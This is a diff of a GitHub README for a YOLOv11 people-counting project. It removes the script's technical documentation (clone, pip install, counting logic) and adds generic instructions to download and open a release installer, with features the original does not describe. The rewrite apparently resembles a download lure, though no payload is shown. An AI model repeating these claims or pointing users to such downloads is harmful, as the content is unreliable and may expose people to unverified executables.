@@ -1,98 +1,65 @@
-# 🎥 AI-Powered People Counting & Foot-Traffic Analytics
+# 🛠️ YOLOv11-People-Enter-Exit-Detector - Real-Time People Counting Made Easy
 
-An advanced Computer Vision system that performs real-time detection, tracking, and bidirectional counting of individuals in a monitored space. This project utilizes **YOLOv11** for high-precision detection and **Polygon ROI (Region of Interest)** logic to determine entry and exit events.
+## 🎉 Overview
+Welcome to YOLOv11-People-Enter-Exit-Detector! This application offers a real-time solution for counting people and analyzing foot traffic. It uses advanced technology to track individuals as they enter or exit a designated area, making it ideal for retail analytics and occupancy monitoring.
 
----
+## ⬇️ Download Now
+[![Download YOLOv11-People-Enter-Exit-Detector](https://img.shields.io/badge/Download%20Now-%20YOLOv11%20People%20Detector-blue.svg)](https://github.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/releases)
 
-<p align="center">
-  <img src="assets/project_output-optimize.gif" alt="YOLOv11 People Detector Output" width="800">
-</p>
+## 🚀 Getting Started
+To start using the application, you need to download and install it. This section will guide you step-by-step.
 
----
+### 📥 Download & Install
+1. Visit this page to download: [YOLOv11 Releases](https://github.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/releases).
+2. Locate the latest version at the top of the Releases page.
+3. Click on the release that matches your operating system (e.g., Windows, macOS, Linux).
+4. Once the file is downloaded, locate it in your Downloads folder.
+5. Open the file to start the installation process. Follow the prompts to complete the setup.
 
-## 🌟 Features
------------
+### ⚙️ System Requirements
+Before installing, ensure your system meets these requirements:
+- **Operating System**: Windows 10 or later, macOS High Sierra or later, or any modern Linux distribution.
+- **RAM**: At least 8 GB recommended.
+- **CPU**: Intel i5 or equivalent.
+- **GPU**: NVIDIA GTX 1050 or higher for optimal performance (optional).
+- **Storage**: At least 500 MB of free space.
 
--   **Real-time Object Tracking:** Implements the `persist=True` parameter in YOLOv11 to maintain unique identities (IDs) for every person in the frame.
--   **Bidirectional Counting:** Uses dual-polygon logic to distinguish between people entering and exiting a premises.
--   **Live Occupancy Analytics:** Dynamically calculates the current number of people inside based on `Entered - Exited`.
--   **Visual Debugging:** Renders bounding boxes, unique track IDs, and counting boundaries directly onto the video stream.
--   **Automated Export:** Processed footage is automatically saved with all overlays (counters, polygons, boxes) using the `VideoWriter` module.
+### 🖥️ Features
+- **Real-Time Tracking**: Track multiple people simultaneously as they move in and out of the specified zones.
+- **Dual-Polygon Region of Interest (ROI)**: Set customizable entry and exit zones.
+- **Automated Video Reporting**: Generate reports of foot traffic for better analytical insights.
+- **Easy Setup**: Simple to use with no programming skills required.
 
-## 🛠️ Technical Stack
--------------------
+### 📊 Application Usage
+After installation, follow these steps to run the application:
 
--   **Core Engine:** YOLO11 (Ultralytics) for object detection.
--   **Processing:** Python, NumPy (for coordinate handling).
--   **Vision & UI:** OpenCV (cv2) for video I/O and CVZone for stylized text/UI overlays.
--   **Geospatial Logic:** `cv2.pointPolygonTest` to accurately detect when a person's center-point crosses specific spatial boundaries.
+1. Launch the application from your applications menu or desktop shortcut.
+2. Connect a camera or upload a video file that captures the area you want to monitor.
+3. Define the entry and exit zones using the visual interface.
+4. Start the tracking process to begin monitoring foot traffic.
 
-## 📐 Algorithmic Logic
---------------------
+### 🔍 Troubleshooting
+If you encounter issues, consider these common solutions:
+- **Installation Fails**: Ensure you have administrative rights on the system.
+- **Tracking Issues**: Check your camera placement and lighting conditions.
+- **Performance Lags**: Close unnecessary applications running on your device to free up resources.
 
-The system defines two specific polygonal areas (`area1` and `area2`) placed near a doorway or threshold:
+### 🔄 Updating the Application
+For the best experience, regularly check for updates on the Releases page. Follow the same steps as above to download the latest version.
 
-1.  **Detection:** The model identifies a `person` and assigns a `track_id`.
-2.  **Point of Interest:** The system tracks the bottom-center coordinate $(x_1, y_2)$ of the bounding box---the point where the person's feet touch the ground.
-3.  **Cross-Verification:**
-    -   **Entry:** If a `track_id` is first detected in `area2` and subsequently moves into `area1`, the system increments the **Entered** counter.
-    -   **Exit:** If a `track_id` is first detected in `area1` and subsequently moves into `area2`, the system increments the **Exited** counter.
-4.  **State Management:** Python dictionaries (`enter` and `exits`) store the initial state of each unique ID to prevent double-counting.
+## 🗃️ Support & Contributions
+While this application is designed for ease of use, you may have questions. Feel free to check the "Issues" section on GitHub for troubleshooting information or submit your own query.
 
-## 🚀 Setup & Installation
------------------------
+- If you want to contribute to the project, please follow the guidelines in the "Contributing" section in the repository.
 
-1.  **Clone the repository:**
+## 🔗 Related Topics
+To further enhance your understanding of this tool, explore concepts related to:
+- People Counting
+- Object Detection
+- Video Analytics
+- Occupancy Monitoring
 
-    Bash
+## 💡 Conclusion
+The YOLOv11-People-Enter-Exit-Detector aims to provide efficient solutions for tracking foot traffic. By following this guide, you will be well on your way to utilizing its powerful features.
 
-    ```
-    git clone https://github.com/[Your-Username]/people-counting-yolo11.git
-    cd people-counting-yolo11
-
-    ```
-
-2.  **Install dependencies:**
-
-    Bash
-
-    ```
-    pip install ultralytics opencv-python cvzone numpy
-
-    ```
-
-3.  **Run the application:**
-
-    Bash
-
-    ```
-    python main.py
-
-    ```
-
-## 📊 Configuration
-----------------
-
-You can customize the detection area by modifying the polygon coordinates in `main.py`:
-
-Python
-
-```
-area1 = [(250, 444), (211, 448), (473, 575), (514, 566)]
-area2 = [(201, 449), (177, 453), (420, 581), (457, 577)]
-
-```
-
-*Use the integrated RGB mouse callback feature to find the exact $(x, y)$ coordinates for your specific camera angle.*
-
-## 🎥 Output Example
------------------
-
-The system generates an `output_people_count.mp4` file containing:
-
--   Real-time counters for **Entered**, **Exited**, and **Current** occupancy.
--   Unique Tracking IDs for every detected individual.
--   Visual boundaries (Pink polygons) showing the active detection zones.
-
-
-
+[![Download YOLOv11-People-Enter-Exit-Detector](https://img.shields.io/badge/Download%20Now-%20YOLOv11%20People%20Detector-blue.svg)](https://github.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/releases)
